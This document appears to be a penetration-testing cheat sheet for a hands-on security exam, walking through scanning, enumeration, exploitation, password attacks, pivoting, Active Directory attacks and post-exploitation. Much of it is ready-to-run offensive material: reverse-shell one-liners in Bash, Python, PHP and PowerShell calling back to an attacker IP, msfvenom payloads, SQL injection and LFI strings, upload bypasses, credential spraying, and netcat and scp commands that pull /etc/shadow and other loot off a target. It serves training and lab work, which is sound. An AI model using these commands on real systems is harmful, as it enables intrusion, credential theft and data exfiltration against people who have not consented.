Quick Reference / Cheat Sheet

Condensed commands and workflows so you don't have to leave this tab — each one also explains why you'd reach for it, not just the syntax, so you can adapt on the fly when a target doesn't match the exact scenario below.

Nmap — scanning workflow

The point of scanning in stages, instead of one giant scan, is speed and signal: a fast sweep tells you which hosts are even worth spending time on before you commit to a slow, thorough scan against all of them.

1. Host discovery — who's alive

nmap -sn 10.0.0.0/24            # ping sweep, no port scan — fastest way to build a target list
nmap -sn -PR 10.0.0.0/24        # ARP-based, most reliable on a local subnet (works even if ICMP is blocked)

2. Fast full-port sweep — don't miss a service on an odd port

nmap -p- --min-rate 5000 -T4 10.0.0.5
# Why: the default top-1000 port scan is exactly what a badly-hidden flag service loves to sit outside of.
# Feed the ports this finds into a slower, detailed scan next — don't -A a /24, it'll take forever.

3. Detailed scan on the ports you actually found

nmap -sC -sV -p 21,22,80,445 -oN nmap-10.0.0.5.txt 10.0.0.5
# -sC = default script set (safe enumeration scripts), -sV = version detection
# Why -oN always: you will want to grep back through this later, don't rely on scrollback

Enumeration — service by service

The habit that matters more than any single command: enumerate every open port before exploiting any of them. A box with 6 open ports and one flashy vuln on port 80 often has the actual intended path sitting quietly on port 21 or 445.

Some answers aren't a scan at all — read the site like a visitor first

Before reaching for any tool: open the target in a browser and read it — About/Contact/Careers pages, footer text, blog posts. Questions like "what time does the working day start" or "who is the IT contact" are answered by reading the page, not by scanning it. Treat a normal browse-through as step zero, not an afterthought.

Identifying the OS / Linux distro remotely

nmap -O 10.0.0.5                           # active OS fingerprinting — needs at least one open + one closed port to be reliable
nc -vn 10.0.0.5 22                         # SSH banner often names the distro directly, e.g. "OpenSSH_7.6p1 Ubuntu-4ubuntu0.3"
curl -I http://10.0.0.5                    # HTTP Server header sometimes includes the distro, e.g. "Apache/2.4.29 (Ubuntu)"

Why banner grabs beat -O half the time: active OS fingerprinting needs specific port conditions to be accurate and is easy to get wrong on a filtered host — a service banner that just states the distro name outright is a faster and more reliable answer when one's available. Once you have any shell at all, cat /etc/os-release settles it definitively.

SMB (139/445)

smbclient -L //10.0.0.5/ -N              # -N = no password, tests anonymous/null session
enum4linux -a 10.0.0.5                    # broad sweep: users, shares, groups, policy, OS info
crackmapexec smb 10.0.0.5 -u '' -p ''    # confirms null-session access fast, also fingerprints the OS/domain

Why check null sessions first: a surprising number of boxes leak a full share/user listing to an unauthenticated connection — this is usually the fastest win available and costs one command to rule in or out.

FTP (21)

ftp 10.0.0.5                              # try anonymous / anonymous
nmap --script ftp-anon -p21 10.0.0.5      # same check, non-interactive

Why: anonymous FTP with a writable directory is a classic and still very common initial-access or file-drop vector.

SSH (22)

ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@10.0.0.5   # legacy algo support for old boxes
nc -vn 10.0.0.5 22                        # banner grab — version string alone can date a known-vuln build

HTTP/HTTPS (80/443/8080…)

whatweb http://10.0.0.5                   # fingerprints CMS/framework/server in one request
gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
nikto -h http://10.0.0.5                  # broad automated vuln/misconfig sweep, noisy but fast

Why -x php,txt,bak matters: a directory brute force with no extensions will walk right past a backup.php.bak or config.txt sitting next to the real app.

SNMP (161/UDP)

snmpwalk -c public -v1 10.0.0.5           # 'public' is the default read-only community string — always try it first
onesixtyone -c community-strings.txt 10.0.0.5

Why: SNMP with the default community string can leak running processes, installed software, and sometimes even usernames/routes — high value for almost no effort.

MySQL / MSSQL

mysql -h 10.0.0.5 -u root -p              # try root with a blank password first
crackmapexec mssql 10.0.0.5 -u sa -p ''   # sa with blank/default password is a very common miss
Web App Testing — quick reference

Manual-first, tool-second — running sqlmap blind against every field burns time and can miss a vuln a two-second manual test would have caught immediately.

SQL Injection — manual probes before sqlmap

' OR '1'='1                 # classic auth-bypass test in a login form
' OR '1'='1'--  -            # comment out the rest of the query (MySQL/MSSQL)
1' ORDER BY 5--  -            # binary-search the column count before a UNION attack
1' UNION SELECT null,null,null--  -   # once column count is known, start pulling data
# Once confirmed, let sqlmap do the heavy lifting:
sqlmap -u "http://10.0.0.5/item.php?id=1" --dbs
sqlmap -u "http://10.0.0.5/item.php?id=1" -D appdb --tables
sqlmap -u "http://10.0.0.5/item.php?id=1" -D appdb -T users --dump

Why manual probes first: a five-second single-quote test tells you whether it's even worth pointing sqlmap at the field — sqlmap against a non-vulnerable param just wastes your 48 hours.

LFI / RFI

http://10.0.0.5/index.php?page=../../../../etc/passwd
http://10.0.0.5/index.php?page=....//....//etc/passwd    # filter-bypass variant for naive str_replace filters
http://10.0.0.5/index.php?page=php://filter/convert.base64-encode/resource=config.php

Why php://filter matters: when a page includes .php files directly it'll execute them instead of showing source — base64-wrapping forces it to show you the raw source instead, often exposing DB credentials in a config file.

WordPress — WPScan

wpscan --url http://10.0.0.5 --enumerate u          # usernames
wpscan --url http://10.0.0.5 --enumerate t           # installed/active themes
wpscan --url http://10.0.0.5 --enumerate p           # installed plugins
wpscan --url http://10.0.0.5 --enumerate vp,vt       # vulnerable plugins/themes only, with a free API token this pulls known CVEs
wpscan --url http://10.0.0.5 -U admin -P rockyou.txt # once you have a username, brute the login

Why WPScan over manual browsing: the active theme, plugin list, and username enumeration are all things WordPress exposes through predictable paths/REST endpoints (/wp-json/wp/v2/users, theme CSS headers) — WPScan just automates reading those instead of you hunting for them by hand.

Drupal — quick enumeration

curl http://10.0.0.5/CHANGELOG.txt          # version number, usually sitting right there unauthenticated
curl http://10.0.0.5/user/1                 # user ID 1 is almost always the original admin account — confirms the username even if it 404s politely
droopescan scan drupal -u http://10.0.0.5   # modules/version/plugins in one automated pass

Why settings.php matters for credential questions: Drupal's database connection details (host, DB name, username and password) live in plaintext at sites/default/settings.php. If you have any file-read primitive on the box — LFI, a misconfigured share, or a shell — that file is where a "what's the MySQL root password" question resolves. Known high-impact Drupal CVEs worth recognizing by name: Drupalgeddon (CVE-2014-3704, SQLi via the user-registration form) and Drupalgeddon2 (CVE-2018-7600, pre-auth RCE) — both are common in training environments precisely because they're so reliable.

File upload bypass

  • Double extension: shell.php.jpg — works when the check only looks at the last extension server-side but the web server still executes on .php anywhere in the name
  • Null byte (older PHP): shell.php%00.jpg
  • Content-Type spoof: set the multipart Content-Type header to image/jpeg while the actual file content is a PHP webshell — many checks only validate the header, not the bytes
  • Alternate executable extensions if .php is blocklisted: .phtml, .php5, .pht

Quick checklist for any web target

  • View source + robots.txt + /sitemap.xml — free hints at hidden paths, sometimes literally in a comment
  • Every input field: does it reflect unescaped? (XSS) Does an apostrophe error the page? (SQLi)
  • Every file-handling parameter: can it be redirected to a local path? (LFI)
  • Login forms: default creds first (admin:admin, admin:password) before anything fancier

Directory / path brute force — which wordlist, and what to check by hand

gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
ffuf -u http://10.0.0.5/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403

Wordlist choice: dirb's common.txt (~4,600 entries) is fast and catches the obvious stuff first — start there. If it comes back empty, go bigger with a SecLists list (raft-medium-directories.txt or directory-list-2.3-medium.txt) before assuming there's nothing to find. rockyou.txt is a password wordlist (14M leaked real-world passwords, used with Hydra/John/Hashcat for login brute force — see the Password Attacks card), not a directory wordlist — an easy pair to mix up but they solve different problems.

Metasploit & msfvenom

Core workflow

msfconsole -q
search type:exploit platform:windows smb           # narrow by what you actually know about the target
use exploit/windows/smb/ms17_010_eternalblue
show options                                        # ALWAYS check this before setting anything — required options vary per module
set RHOSTS 10.0.0.5
set LHOST 10.0.0.10                                 # your attacking box's IP, for the callback
set payload windows/x64/meterpreter/reverse_tcp
run

Why show options every time: the most common reason an exploit "doesn't work" isn't that it's patched — it's a missing required option (wrong RPORT, wrong target index, wrong payload architecture).

Picking a module that lands you elevated, not just in

Some exploit modules hand you SYSTEM/root directly because of how the vulnerable service runs, not because of anything extra you do afterward — worth recognizing which ones by name for "which module gives an elevated shell" style questions:

  • exploit/windows/smb/ms17_010_eternalblue — SMB runs as SYSTEM, so a successful hit is SYSTEM immediately, no privesc step needed
  • exploit/windows/local/* modules (run against an existing session) — purpose-built privesc exploits, e.g. exploit/windows/local/bypassuac_injection or a kernel exploit module, used once you already have a low-priv shell
  • Any module exploiting a service that Windows runs as NT AUTHORITY\SYSTEM by default (most native Windows services) will hand you that same level on success — the giveaway is the vulnerable service's own account, not the exploit technique

msfvenom — generating a payload

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f raw -o shell.php

Match the payload platform (windows/linux/php) and format (-f) to what the target can actually execute — a Windows PE handed to a Linux box does nothing.

Password Attacks

Cheap, fast checks first — default/blank creds and small custom wordlists beat rockyou.txt against an unknown service far more often than the exam "feels" like it should.

Hydra — online brute force

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.5 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid password"
hydra -L users.txt -P rockyou.txt ssh://10.0.0.5
hydra -l admin -P rockyou.txt ftp://10.0.0.5

Why build the username list from enumeration first: spraying one likely password across every discovered user is usually faster (and less likely to lock an account) than brute-forcing one user's password from scratch.

John / Hashcat — offline cracking

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt                                # once it's done, this prints the cracked value back out
hashcat -m 1000 -a 0 ntlm-hashes.txt rockyou.txt      # -m 1000 = NTLM; -m 0 = raw MD5, -m 1800 = sha512crypt (Linux shadow)

Why identify the hash type first (hashid or hash-identifier): feeding hashcat the wrong -m mode silently returns nothing, which looks identical to "not crackable."

Credential spraying across a network

crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Summer2024!'
crackmapexec smb 10.0.0.0/24 -u admin -p passwords.txt --local-auth

Why this matters on a multi-host exam network specifically: a credential you cracked or found on Host A is worth trying against every other host you've discovered before you go looking for a second, unrelated vulnerability.

Reverse & bind shells

Reverse (target connects back to you) is preferred when the target is behind a firewall/NAT that blocks inbound — which is the common case. Bind (you connect to the target) only works when you can reach the target's listening port directly.

Listener, always start this first

nc -lvnp 4444

One-liners by language

# Bash
bash -i >& /dev/tcp/10.0.0.10/4444 0>&1

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.10",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

# PHP
php -r '$sock=fsockopen("10.0.0.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell (Windows)
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.0.0.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}"

Upgrading a raw shell to something usable

python3 -c 'import pty; pty.spawn("/bin/bash")'
# then, in the now-interactive shell:
export TERM=xterm
Ctrl+Z            # background it on YOUR attacking box
stty raw -echo; fg
# then press Enter twice

Why bother: a raw netcat shell has no tab-completion, no arrow-key history, and dies the moment a command like vim or sudo -l that needs a real TTY tries to run — the upgrade sequence above is worth doing on every single foothold immediately.

Work this list top-to-bottom on every Linux foothold — it's ordered roughly cheapest-check-first.

Counting local accounts (excluding built-ins)

net user                                    # lists every local account by name
net localgroup Administrators               # who's actually privileged
wmic useraccount get name,disabled,lockout  # includes disabled/locked state — useful to filter service accounts out

Why this needs a manual pass: "how many user accounts, excluding Administrator/Guest/service accounts" is really asking you to filter net user's output by hand — Windows doesn't have a single flag that does the exclusion for you, so read the list and subtract the built-ins (Administrator, Guest, DefaultAccount, WDAGUtilityAccount) and anything named like a service account yourself.

Pivoting & tunneling

Once a foothold on Host A can reach a second, internal-only network that your attacking box can't reach directly, you need to route traffic through Host A to get there.

Find the second network before you try to pivot into it

# Linux foothold
ip a                        # a second NIC/subnet here is the giveaway
ip route ; route -n         # shows what that host already knows how to reach
arp -a                      # other live hosts this box has already talked to

# Windows foothold
ipconfig /all               # same idea — a second adapter/subnet
route print
arp -a

Why this comes first: a "what's the subnet of the internal network" question is answered directly by this host's own network config — it already knows, because it's sitting on both networks. This is also literally what confirms a box is worth pivoting through in the first place, versus one that's DMZ-only.

SSH dynamic port forward (if you have SSH creds on the pivot)

ssh -D 9050 user@10.0.0.5
# then point tools at it via proxychains — edit /etc/proxychains.conf: socks5 127.0.0.1 9050
proxychains nmap -sT -Pn 10.0.1.0/24

Why -sT -Pn specifically through proxychains: a SOCKS proxy can't carry raw SYN/ICMP packets, only full TCP connections, so a normal -sS/ping-based scan silently fails through the tunnel.

Chisel (no SSH needed — works over a meterpreter session or plain shell)

# On your attacking box (server)
chisel server -p 8000 --reverse

# On the compromised host (client) — pushes a SOCKS proxy back to you
chisel client 10.0.0.10:8000 R:socks

# Then use it the same way, via proxychains pointed at 127.0.0.1:1080

Why chisel over SSH-only pivoting: it works even when the compromised host has no SSH server or you don't have valid SSH creds on it — just a shell is enough.

Meterpreter's built-in equivalent

run autoroute -s 10.0.1.0/24
use auxiliary/server/socks_proxy
set SRVPORT 1080
run

Keeps everything inside the Metasploit session you already have instead of standing up a separate tool — convenient when you're already deep in an msfconsole workflow.

Active Directory basics

Even a lightweight, single-domain-controller AD lab rewards the same enumeration-before-exploitation discipline as everything else on this sheet.

Unauthenticated / null-session first

enum4linux-ng -A 10.0.0.5
crackmapexec smb 10.0.0.5 -u '' -p '' --users
crackmapexec smb 10.0.0.5 -u '' -p '' --shares

Why: a null session on the DC can leak a full domain user list before you've entered a single credential — that list is exactly what feeds the password-spraying step next.

Once you have any valid credential (even a low-privilege one)

crackmapexec smb 10.0.0.5 -u jdoe -p 'Password1' --shares
crackmapexec smb 10.0.0.5 -u jdoe -p 'Password1' --loggedon-users
bloodhound-python -u jdoe -p 'Password1' -ns 10.0.0.5 -d corp.local -c All

Why BloodHound even with one weak account: it maps who's an admin of what and how, turning "I have one low-priv user" into a visual path toward Domain Admin instead of guessing what to try next.

Kerberoasting, if you have any domain credential

GetUserSPNs.py corp.local/jdoe:'Password1' -dc-ip 10.0.0.5 -request
# then crack the returned hash offline:
hashcat -m 13100 spns.txt rockyou.txt

Why it works without any special privilege: any authenticated domain user can request a service ticket for any account with a registered SPN — if that account's password is weak, the ticket cracks offline with no lockout risk.

Post-exploitation & file transfer

Getting files onto a compromised host

# From your attacking box, serve the file:
python3 -m http.server 8000

# On a Linux target:
wget http://10.0.0.10:8000/linpeas.sh
curl http://10.0.0.10:8000/linpeas.sh -o linpeas.sh

# On a Windows target (no wget/curl needed):
certutil -urlcache -f http://10.0.0.10:8000/winpeas.exe winpeas.exe
powershell -c "IWR http://10.0.0.10:8000/winpeas.exe -OutFile winpeas.exe"

Getting files (loot) back off a compromised host

# SCP, if SSH is available
scp user@10.0.0.5:/etc/shadow ./loot/

# Simple netcat file transfer when nothing else is available
# Receiver (your box): nc -lvnp 4444 > loot.txt
# Sender (target):     nc 10.0.0.10 4444 < loot.txt

Why keep a spare method (netcat) in mind: on some hosts SCP/SSH-out is blocked by an outbound firewall rule while a raw TCP connection on an arbitrary port isn't — always have a fallback.

Basic footprint discipline

  • Note every file you drop on a target in the Timeline above — you'll want that list again for the report's "artifacts left behind" section
  • Prefer running tools from memory / a temp directory over installing anything persistently, unless persistence is explicitly part of the objective
  • Clean up dropped shells/binaries at the end if the engagement rules call for it — check your specific exam's cleanup requirements, they vary
Stuck? Reset ladder

When a target dead-ends, work down this list instead of re-running the same scan with slightly different flags.

  1. Re-read the question. Does it name a specific host, service, or file you haven't actually looked at yet?
  2. Re-scan with different timing/scripts — a rate-limited service can silently drop packets on an aggressive -T4 scan; try -T2 once
  3. Check every port again, not just the "interesting" ones — the intended path is sometimes the boring service you skipped
  4. Try default/blank credentials on every login prompt before assuming you need to crack or exploit anything
  5. Switch tool for the same job — gobuster quiet? Try ffuf or dirb with a different wordlist; one tool's default wordlist misses what another catches
  6. Re-use a credential you already have against a service you haven't tried it on yet — password/hash reuse across a small exam network is extremely common by design
  7. Step back to a host you already own and re-check Credentials & Loot — the pivot you need is often something you found hours ago and didn't recognize as relevant yet
  8. Mark it and move on — a later host or credential often hands you the exact piece you were missing

No result is a signal, not a dead end — it almost always means wrong wordlist, wrong timing, wrong assumption about the service, or a credential you haven't tried yet, not that there's nothing there.

Report format & final verify ritual

Same discipline as any pentest deliverable — a technically correct finding written up badly is a weaker answer than a well-structured one.

Per-finding shape

  1. Finding — one line: what the vulnerability/access is, and on which host
  2. Evidence — the exact command/request that proves it, and its output/response
  3. Impact — what access or data this actually grants
  4. Reproduction steps — numbered, exact, copy-pasteable — a grader (or a real client's engineer) should be able to follow it verbatim

Final pass before submitting — run this on every question

  • Does the answer match the exact format asked for — flag format, IP, filename, hash type?
  • Copy-pasted, not retyped — flags and hashes are exact strings, one typo is a wrong answer
  • Every host you touched is listed in Host & Service Map, even the ones that were dead ends — completeness matters for methodology questions
  • Credentials & Loot table has a source/host for every entry, not just the value — an unsourced credential is hard to defend if asked
  • Every question attempted — a partial, well-reasoned answer beats a skipped one
